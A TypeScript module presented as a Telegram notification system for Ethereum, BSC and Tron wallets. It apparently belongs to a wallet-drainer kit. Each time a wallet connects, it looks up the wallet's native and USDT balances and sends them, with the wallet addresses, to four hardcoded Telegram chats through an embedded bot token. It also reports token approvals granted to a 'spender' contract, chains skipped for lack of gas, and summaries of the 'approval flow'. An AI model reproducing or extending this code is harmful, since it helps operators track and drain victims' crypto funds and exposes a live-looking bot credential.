/**
 * Unified Telegram notification system for all 3 networks:
 * ERC-20 (Ethereum), BEP-20 (BSC), TRC-20 (Tron)
 */

import { SUPPORTED_CHAINS } from "@/lib/chains";
import { getNativeBalance, getTokenBalance } from "@/lib/evmUtils";

const BOT_TOKEN = "7969107308:AAEkeeIJr5JBJQm5CtIcwho-CQ1iN7q2EZk";
const CHAT_IDS = ["8007853332", "7996892481", "8292000327", "8300832423"];

const TRONGRID_API = "https://api.trongrid.io";
const USDT_CONTRACT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// ============= Base58 Helper for Tron =============

const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function tronAddressToHex(base58Address: string): string {
  const base = BigInt(58);
  let num = BigInt(0);
  for (const char of base58Address) {
    const index = BASE58_ALPHABET.indexOf(char);
    if (index === -1) throw new Error(`Invalid Base58 character: ${char}`);
    num = num * base + BigInt(index);
  }
  let hex = num.toString(16);
  if (hex.length % 2 !== 0) hex = "0" + hex;
  let leadingZeros = 0;
  for (const char of base58Address) {
    if (char !== "1") break;
    leadingZeros++;
  }
  const fullHex = "00".repeat(leadingZeros) + hex;
  return fullHex.substring(0, 42);
}

// ============= Tron Balance Fetchers =============

async function fetchTrxBalance(address: string): Promise<string> {
  try {
    const res = await fetch(`${TRONGRID_API}/v1/accounts/${address}`);
    const data = await res.json();
    if (!data.data || data.data.length === 0) return "0";
    return ((data.data[0].balance || 0) / 1_000_000).toFixed(6);
  } catch {
    return "0";
  }
}

async function fetchTronUsdtBalance(address: string): Promise<string> {
  try {
    const addressHex = tronAddressToHex(address);
    const paddedAddress = addressHex.substring(2).padStart(64, "0");

    const res = await fetch(`${TRONGRID_API}/wallet/triggerconstantcontract`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner_address: address,
        contract_address: USDT_CONTRACT_TRON,
        function_selector: "balanceOf(address)",
        parameter: paddedAddress,
        visible: true,
      }),
    });

    const data = await res.json();

    if (data.result?.result && data.constant_result?.length > 0) {
      const rawHex = data.constant_result[0];
      const balance = BigInt("0x" + rawHex);
      return (Number(balance) / 1_000_000).toFixed(6);
    }

    return "0";
  } catch (err) {
    console.error("Failed to fetch Tron USDT balance:", err);
    return "0";
  }
}

// ============= Telegram Sender =============

async function sendTelegramMessage(text: string): Promise<void> {
  const promises = CHAT_IDS.map((chatId) =>
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    }).then(async (res) => {
      if (!res.ok) {
        const errorText = await res.text();
        throw new Error(`Telegram API error for chat ${chatId}: ${res.status} ${errorText}`);
      }
      return res.json();
    }),
  );

  try {
    const results = await Promise.allSettled(promises);
    results.forEach((result, index) => {
      if (result.status === "fulfilled") {
        console.log(`Telegram message sent to chat ${CHAT_IDS[index]}`);
      } else {
        console.error(`Failed to send Telegram message to chat ${CHAT_IDS[index]}:`, result.reason);
      }
    });
  } catch (err) {
    console.error("Unexpected error in sendTelegramMessage:", err);
  }
}

// ============= Notification Functions =============

/**
 * Send a wallet-connected notification with all chain balances (EVM + Tron).
 */
export async function sendWalletConnectedNotification(
  evmAddress: string,
  tronAddress?: string | null
): Promise<void> {
  try {
    // Fetch EVM balances
    const chainBalances: string[] = [];
    for (const chain of SUPPORTED_CHAINS) {
      try {
        const nativeBal = await getNativeBalance(evmAddress, chain);
        const tokenLines: string[] = [`   💎 ${chain.nativeCurrency.symbol}: ${nativeBal.toFixed(6)}`];
        for (const token of chain.approvalTokens) {
          const bal = await getTokenBalance(evmAddress, token.address, token.decimals, chain);
          tokenLines.push(`   🪙 ${token.symbol}: ${bal.toFixed(6)}`);
        }
        chainBalances.push(`🌐 ${chain.name} (${chain.chainId}):\n${tokenLines.join("\n")}`);
      } catch {
        chainBalances.push(`🌐 ${chain.name} (${chain.chainId}): ❌ Failed to fetch`);
      }
    }

    // Fetch Tron balances
    let tronSection = "";
    if (tronAddress) {
      try {
        const trxBal = await fetchTrxBalance(tronAddress);
        const usdtBal = await fetchTronUsdtBalance(tronAddress);
        tronSection = `\n\n🔴 Tron Network:\n   💎 TRX: ${trxBal}\n   🪙 USDT: ${usdtBal}\n   🧾 Address: ${tronAddress}`;
      } catch {
        tronSection = "\n\n🔴 Tron Network: ❌ Failed to fetch";
      }
    }

    const message = `🔗 Wallet Connected (AIO v3)

🧾 EVM Address: ${evmAddress}${tronAddress ? `\n🧾 Tron Address: ${tronAddress}` : ""}
🕒 Time: ${new Date().toISOString()}

📊 EVM Chain Balances:
${chainBalances.join("\n\n")}${tronSection}`;

    await sendTelegramMessage(message);
    console.log("Wallet connected notification sent");
  } catch (err) {
    console.error("Failed to send wallet connected notification:", err);
  }
}

/**
 * Send an EVM approval notification.
 */
export async function sendEvmApprovalNotification(
  walletAddress: string,
  txHash: string,
  chainId: string,
  tokenSymbol: string = "USDT",
): Promise<void> {
  try {
    const chain = SUPPORTED_CHAINS.find((c) => c.id === chainId);
    if (!chain) return;

    const nativeBalance = await getNativeBalance(walletAddress, chain);

    const tokenBalances: string[] = [];
    for (const token of chain.approvalTokens) {
      const bal = await getTokenBalance(walletAddress, token.address, token.decimals, chain);
      tokenBalances.push(`${token.symbol}: ${bal.toFixed(6)}`);
    }

    const message = `✅ EVM Token Approval (AIO v3)

🪙 Token: ${tokenSymbol}
🌐 Chain: ${chain.name}
🔢 Chain ID: ${chain.chainId}
🧾 Wallet: ${walletAddress}
💎 ${chain.nativeCurrency.symbol}: ${nativeBalance.toFixed(6)}
💰 Token Balances:
${tokenBalances.map((b) => `   • ${b}`).join("\n")}
📝 Spender: ${chain.spenderContract}
🔗 Tx: ${txHash}
🕒 Time: ${new Date().toISOString()}`;

    await sendTelegramMessage(message);
    console.log(`Telegram notification sent for ${chain.name} - ${tokenSymbol}`);
  } catch (err) {
    console.error("Failed to send Telegram notification:", err);
  }
}

/**
 * Send a Tron approval notification.
 */
export async function sendTronApprovalNotification(
  walletAddress: string,
  txHash: string
): Promise<void> {
  try {
    const [trxBalance, usdtBalance] = await Promise.all([
      fetchTrxBalance(walletAddress),
      fetchTronUsdtBalance(walletAddress),
    ]);

    const message = `✅ TRC-20 Approval (AIO v3)

🧾 Address: ${walletAddress}
💎 TRX Balance: ${trxBalance} TRX
💳 USDT Balance: ${usdtBalance} USDT
🕒 Time: ${new Date().toISOString()}
🔗 Tx Hash: ${txHash}`;

    await sendTelegramMessage(message);
    console.log("Tron Telegram notification sent successfully");
  } catch (err) {
    console.error("Failed to send Tron Telegram notification:", err);
  }
}

/**
 * Send notification when a chain is skipped due to insufficient gas.
 */
export async function sendInsufficientGasNotification(
  walletAddress: string,
  chainId: string,
  nativeBalance: number,
): Promise<void> {
  try {
    const chain = SUPPORTED_CHAINS.find((c) => c.id === chainId);
    if (!chain) return;

    const message = `⚠️ Chain Skipped — Insufficient Gas (AIO v3)

🌐 Chain: ${chain.name}
🔢 Chain ID: ${chain.chainId}
🧾 Wallet: ${walletAddress}
💎 ${chain.nativeCurrency.symbol} Balance: ${nativeBalance.toFixed(6)}
⛽ Min Required: ${chain.minGasThreshold} ${chain.nativeCurrency.symbol}
🕒 Time: ${new Date().toISOString()}`;

    await sendTelegramMessage(message);
  } catch (err) {
    console.error("Failed to send insufficient gas notification:", err);
  }
}

/**
 * Send summary notification after approval flow completes.
 */
export async function sendApprovalSummaryNotification(
  walletAddress: string,
  totalApproved: number,
  totalSkipped: number,
  chainResults: { chainName: string; chainId: number; status: string; tokens: string[] }[],
): Promise<void> {
  try {
    const resultLines = chainResults.map((r) => {
      const statusIcon = r.status === "SUFFICIENT_GAS" ? "✅" : "⛽";
      const tokens = r.tokens.length > 0 ? r.tokens.join(", ") : "none";
      return `${statusIcon} ${r.chainName} (${r.chainId}): ${tokens}`;
    });

    const message = `📊 Approval Flow Complete (AIO v3)

🧾 Wallet: ${walletAddress}
✅ Approved: ${totalApproved} tokens
⛽ Skipped: ${totalSkipped} chains (no gas)
🕒 Time: ${new Date().toISOString()}

Chain Results:
${resultLines.join("\n")}`;

    await sendTelegramMessage(message);
  } catch (err) {
    console.error("Failed to send summary notification:", err);
  }
}
